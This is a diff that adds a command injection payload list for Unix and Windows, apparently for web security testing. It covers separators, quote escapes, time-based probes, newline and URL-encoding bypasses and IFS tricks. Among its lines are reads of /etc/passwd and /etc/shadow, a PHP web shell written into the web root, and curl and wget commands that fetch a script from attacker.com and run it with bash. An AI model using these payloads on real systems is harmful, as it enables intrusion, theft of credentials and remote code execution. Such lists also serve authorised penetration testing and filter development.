@@ -1,0 +1,117 @@
+# WebSecure Command Injection Payload List — Unix/Windows, encoding bypass, chaining
+# ── Basic Unix ──
+; id
+| id
+|| id
+& id
+&& id
+`id`
+$(id)
+; id #
+; id //
+; echo CMDI_$(id)
+| echo CMDI_$(id)
+`echo CMDI_$(whoami)`
+$(echo CMDI_$(id))
+; /usr/bin/id
+; /bin/id
+; cat /etc/passwd
+| cat /etc/passwd
+; cat /etc/shadow
+; ifconfig
+; ip addr
+; env
+; printenv
+; uname -a
+; hostname
+# ── Unix with quote escape ──
+' ; id #
+" ; id #
+'; id #
+"; id #
+') ; id
+") ; id
+' | id
+" | id
+'; cat /etc/passwd #
+"; cat /etc/passwd #
+# ── Unix time-based ──
+; sleep 5
+| sleep 5
+|| sleep 5
+& sleep 5
+&& sleep 5
+; sleep 5 #
+; /bin/sleep 5
+; ping -c 5 127.0.0.1
+; ping -n 5 127.0.0.1
+# ── Unix newline injection ──
+%0a id
+%0a cat /etc/passwd
+%0d%0a id
+\nid
+\n/bin/id
+# ── Unix environment variable injection ──
+; echo $PATH
+; echo $HOME
+; echo $USER
+; echo $SHELL
+# ── Unix file write ──
+; echo '<?php system($_GET[cmd]);?>' > /var/www/html/shell.php
+; curl http://attacker.com/shell.sh | bash
+; wget http://attacker.com/shell.sh -O /tmp/x && bash /tmp/x
+# ── Windows cmd ──
+& whoami
+| whoami
+&& whoami
+|| whoami
+& echo %COMPUTERNAME%
+& echo %USERNAME%
+& type C:\Windows\win.ini
+& dir C:\
+& ipconfig /all
+& net user
+& net localgroup administrators
+& tasklist
+& systeminfo
+& wmic computersystem get name
+# ── Windows time-based ──
+& timeout /T 5 /NOBREAK
+; timeout /T 5 /NOBREAK
+& ping -n 5 127.0.0.1
+| ping -n 5 127.0.0.1
+# ── Windows PowerShell ──
+; powershell -command "whoami"
+; powershell -enc JAB3AG8AaABhAG0AaQA=
+& powershell -c "whoami"
+# ── Encoding bypass ──
+%3b id
+%7c id
+%26 id
+%0a id
+%3b cat /etc/passwd
+; c'a't /etc/passwd
+; c"a"t /etc/passwd
+; \cat /etc/passwd
+; ca\t /etc/passwd
+# ── Via input fields ──
+test;id
+test|id
+test`id`
+test$(id)
+test&&id
+test||id
+127.0.0.1;id
+127.0.0.1|id
+127.0.0.1&&id
+127.0.0.1%0aid
+# ── File descriptor / subshell ──
+$(< /etc/passwd)
+${IFS}id
+$IFS$9id
+$((id))
+{id,}
+# ── Bypass via environment ──
+;${IFS}id
+;$'\x69\x64'
+;$'\x63\x61\x74'${IFS}/etc/passwd
